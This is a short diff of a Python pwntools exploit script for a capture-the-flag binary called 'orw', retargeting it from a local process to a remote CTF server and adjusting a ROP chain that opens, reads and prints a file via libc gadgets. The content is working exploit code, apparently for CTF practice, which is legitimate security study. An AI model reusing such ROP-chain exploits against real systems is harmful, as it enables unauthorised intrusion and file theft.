@@ -3,8 +3,8 @@ from pwn import *
 from LibcSearcher import * 
 # context.log_level = 'debug' 
 context.arch = 'amd64'
-p=process('./orw')
-# p=remote('t.ctf.qwq.cc',49317)
+# p=process('./orw')
+p=remote('t.ctf.qwq.cc',49155)
 elf=ELF('./orw')
 libc=ELF('./libc-2.31.so')
 def add(length,content):
@@ -151,7 +151,7 @@ print(hex(puts_plt))
 context.log_level = 'debug' 
 # rop_link=flat([pop_rax,0,pop_rdi,buf_addr+8*25,pop_rsi,4, open_addr,mov_rax_rdi, pop_rsi,buf_addr+8*27,pop_rdx_rcx_rbx,20,20,20,pop_rax,0,read_addr, pop_rdi,buf_addr+8*27,puts_addr,pop_rdi,buf_addr+8*25,puts_addr])
 # open
-rop_link = p64(pop_rdi)+p64(buf_addr+8*25)+p64(pop_rsi)+p64(0)+p64(open_addr)
+rop_link = p64(pop_rdi)+p64(heap_addr+0xa50)+p64(pop_rsi)+p64(0)+p64(open_addr)
 # read
 rop_link+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(heap_addr+0xb50)+p64(pop_rdx_rcx_rbx)+p64(0x30)*3+p64(read_addr)
 # puts
